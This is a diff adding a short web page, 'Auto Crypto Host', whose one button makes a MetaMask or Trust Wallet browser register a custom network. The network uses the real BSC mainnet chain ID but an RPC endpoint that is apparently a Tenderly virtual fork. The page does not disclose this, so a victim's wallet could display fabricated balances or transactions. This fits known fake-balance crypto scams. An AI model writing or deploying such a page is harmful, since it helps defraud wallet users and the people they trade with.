@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Crypto Host</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        async function addRPC() {
+            if (typeof window.ethereum !== "undefined") {
+                try {
+                    await window.ethereum.request({
+                        method: "wallet_addEthereumChain",
+                        params: [{
+                            chainId: "0x38", // BSC Mainnet
+                            chainName: "BSC Custom RPC",
+                            rpcUrls: ["https://virtual.binance.rpc.tenderly.co/5fc28504-f2fa-418b-8de4-ea406ba6685a"],
+                            nativeCurrency: {
+                                name: "BNB",
+                                symbol: "BNB",
+                                decimals: 18
+                            },
+                            blockExplorerUrls: ["https://bscscan.com/"]
+                        }]
+                    });
+                    document.getElementById("rpcButton").classList.add("bg-green-500");
+                    document.getElementById("rpcButton").innerText = "✅ Active Successfully!";
+                } catch (error) {
+                    alert("❌ Error: " + error.message);
+                }
+            } else {
+                alert("⚠️ MetaMask or Wallet not detected. Open this in MetaMask/Trust Wallet browser.");
+            }
+        }
+    </script>
+</head>
+<body class="bg-gray-900 text-white flex items-center justify-center h-screen">
+    <div class="text-center p-8 bg-gray-800 rounded-lg shadow-lg">
+        <h1 class="text-3xl font-semibold mb-4">Crypto Host Server for Wallet</h1>
+        <button id="rpcButton" onclick="addRPC()" class="px-6 py-3 bg-blue-500 text-white font-medium text-lg rounded-lg shadow-md transition duration-300 hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-400">
+            Active Now
+        </button>
+    </div>
+</body>
+</html>
